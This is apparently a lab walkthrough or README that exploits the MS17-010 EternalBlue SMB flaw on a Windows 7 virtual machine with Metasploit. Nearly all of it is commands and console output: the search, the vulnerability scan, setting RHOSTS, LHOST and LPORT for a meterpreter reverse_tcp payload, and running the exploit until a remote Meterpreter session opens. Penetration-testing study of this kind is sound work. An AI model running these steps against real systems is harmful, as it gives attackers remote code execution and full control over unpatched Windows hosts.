# Eternalblue Exploit
![image](https://user-images.githubusercontent.com/72777943/208251008-8c09594f-3134-4dee-b0f9-3cfef8dbf3cc.png)

## Begining The Scan 
To begin we will run Metasploit

$ `msfconole` 

### Search for exploit

We will the use the `search` command, to look for eternalblue 

```
msf6 > search eternalblue

Matching Modules
================

   #  Name                                      Disclosure Date  Rank     Check  Description
   -  ----                                      ---------------  ----     -----  -----------
   0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
   1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
   2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
   3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
   4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution

Interact with a module by name or index. For example info 4, use 4 or use exploit/windows/smb/smb_doublepulsar_rce
```
Once Metasploit was done returning the results of my search, we will use the `auxiliary/scanner/smb/smb_ms17_010` to scan the target machine to see if it was vulnerable.

$ `use auxiliary/scanner/smb/smb_ms17_010 `

### How To Execute Command

To begin we will firstly check what options we have. To do this we can run the `show options` commmand.
```
msf6 auxiliary(scanner/smb/smb_ms17_010) > show options

Module options (auxiliary/scanner/smb/smb_ms17_010):

   Name         Current Setting             Required  Description
   ----         ---------------             --------  -----------
   CHECK_ARCH   true                        no        Check for architecture on vulnerable hosts
   CHECK_DOPU   true                        no        Check for DOUBLEPULSAR on vulnerable hosts
   CHECK_PIPE   false                       no        Check for named pipe on vulnerable hosts
   NAMED_PIPES  /usr/share/metasploit-fram  yes       List of named pipes to check
                ework/data/wordlists/named
                _pipes.txt
   RHOSTS                                   yes       The target host(s), see https://github.com/r
                                                      apid7/metasploit-framework/wiki/Using-Metasp
                                                      loit
   RPORT        445                         yes       The SMB service port (TCP)
   SMBDomain    .                           no        The Windows domain to use for authentication
   SMBPass                                  no        The password for the specified username
   SMBUser                                  no        The username to authenticate as
   THREADS      1                           yes       The number of concurrent threads (max one per host)
```

All we have to do next was to set the `RHOSTS` to the tagets IP. 

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > set RHOSTS 10.0.2.15
RHOSTS => 10.0.2.15
```

Now with everything set, we are able to proceed with running the `run` command

```
msf6 auxiliary(scanner/smb/smb_ms17_010) > run

[+] 10.0.2.15:445         - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)
[*] 10.0.2.15:445         - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```

As shown the tagets machine is likely vulnerable to `MS17-010`! It has also outputted what version the operating system the target machine is running.

### Exploiting 

Now that we know the targets machine is likely vulnerable, we can now proceed to use `exploit/windows/smb/ms17_010_eternalblue`.  To do this we will open metasploit 
again and run the following: 

$ `use exploit/windows/smb/ms17_010_eternalblue`

As previous we will then `show options` and set the options needed before running the exploit.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > show options

Module options (exploit/windows/smb/ms17_010_eternalblue):

   Name           Current Setting  Required  Description
   ----           ---------------  --------  -----------
   RHOSTS         10.0.2.15        yes       The target host(s), see https://github.com/rapid7/met
                                             asploit-framework/wiki/Using-Metasploit
   RPORT          445              yes       The target port (TCP)
   SMBDomain                       no        (Optional) The Windows domain to use for authenticati
                                             on. Only affects Windows Server 2008 R2, Windows 7, W
                                             indows Embedded Standard 7 target machines.
   SMBPass                         no        (Optional) The password for the specified username
   SMBUser                         no        (Optional) The username to authenticate as
   VERIFY_ARCH    true             yes       Check if remote architecture matches exploit Target.
                                             Only affects Windows Server 2008 R2, Windows 7, Windo
                                             ws Embedded Standard 7 target machines.
   VERIFY_TARGET  true             yes       Check if remote OS matches exploit Target. Only affec
                                             ts Windows Server 2008 R2, Windows 7, Windows Embedde
                                             d Standard 7 target machines.


Payload options (windows/x64/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.0.2.5         yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Target
```

Perfect! Now with every set, we can now execute the `exploit` command to try and gain access into the machine.

```
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 10.0.2.5:4444 
[*] 10.0.2.15:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 10.0.2.15:445         - Host is likely VULNERABLE to MS17-010! - Windows 7 Ultimate 7600 x64 (64-bit)
[*] 10.0.2.15:445         - Scanned 1 of 1 hosts (100% complete)
[+] 10.0.2.15:445 - The target is vulnerable.
[*] 10.0.2.15:445 - Connecting to target for exploitation.
[+] 10.0.2.15:445 - Connection established for exploitation.
[+] 10.0.2.15:445 - Target OS selected valid for OS indicated by SMB reply
[*] 10.0.2.15:445 - CORE raw buffer dump (23 bytes)
[*] 10.0.2.15:445 - 0x00000000  57 69 6e 64 6f 77 73 20 37 20 55 6c 74 69 6d 61  Windows 7 Ultima
[*] 10.0.2.15:445 - 0x00000010  74 65 20 37 36 30 30                             te 7600         
[+] 10.0.2.15:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 10.0.2.15:445 - Trying exploit with 12 Groom Allocations.
[*] 10.0.2.15:445 - Sending all but last fragment of exploit packet
[*] 10.0.2.15:445 - Starting non-paged pool grooming
[+] 10.0.2.15:445 - Sending SMBv2 buffers
[+] 10.0.2.15:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 10.0.2.15:445 - Sending final SMBv2 buffers.
[*] 10.0.2.15:445 - Sending last fragment of exploit packet!
[*] 10.0.2.15:445 - Receiving response from exploit packet
[+] 10.0.2.15:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 10.0.2.15:445 - Sending egg to corrupted connection.
[*] 10.0.2.15:445 - Triggering free of corrupted buffer.
[*] Sending stage (200262 bytes) to 10.0.2.15
[+] 10.0.2.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 10.0.2.15:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 3 opened (10.0.2.5:4444 -> 10.0.2.15:49158 ) at 2022-12-17 11:31:38 -0500
```

We can check this exploit ran correctly by simply checking the `sysinfo` command

```
meterpreter > sysinfo
Computer        : SYSUSER-PC
OS              : Windows 7 (6.1 Build 7600).
Architecture    : x64
System Language : en_US
Domain          : WORKGROUP
Logged On Users : 2
Meterpreter     : x64/windows
```

We have done it! we have succesfully gain access into the windows 7 machine via eternalblue. 

For more information you can read up on eternalblue [here](https://en.wikipedia.org/wiki/EternalBlue) 
